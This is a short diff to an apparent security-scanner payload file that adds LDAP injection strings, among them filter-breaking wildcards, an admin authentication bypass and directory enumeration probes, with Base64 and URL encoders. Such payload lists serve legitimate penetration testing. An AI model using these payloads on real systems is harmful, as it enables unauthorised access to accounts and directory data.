@@ -2,6 +2,12 @@
 payload:
   - '*)(uid=*))(|(uid=*'
   - '(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))'
+  - '(&(uid="+user+")(userPassword={MD5}"+base64(pack("H*",md5(pass)))+"))"'
+  - '(&(uid=admin)(!(&(1=0)(userPassword=q))))'
+  - '*(|(mail=*))'
+  - '*(|(objectclass=*))'
+  - 'admin*)((|userpassword=*)'
+  - 'userPassword:2.5.13.18:=123'
 encoder:
   - Base64Flat
   - URL
